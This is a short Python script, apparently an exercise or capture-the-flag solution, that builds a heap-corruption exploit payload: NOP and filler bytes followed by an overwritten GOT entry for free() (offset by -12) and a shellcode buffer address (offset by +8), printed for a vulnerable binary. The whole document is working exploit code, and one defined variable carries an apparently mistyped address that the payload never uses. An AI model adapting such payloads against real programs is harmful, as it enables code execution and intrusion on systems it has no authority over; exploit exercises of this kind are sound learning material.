import sys

#The GOT Address for free is 08049d30. We -12 and fill in Little Endian
GOT_Address = '\x30\x9d\x04\x08'
#The buffer address is 8049ec8. To fill the buffer address we do a +8 and fill it in little endian
buffer_address = '\xc8\x9e\x04\x80'

buf = "\x90"*15+"\xff"*8+"\x24\x9d\x04\x08"+"\xd0\x9e\x04\x08"
print(buf)
sys.stdout.flush()
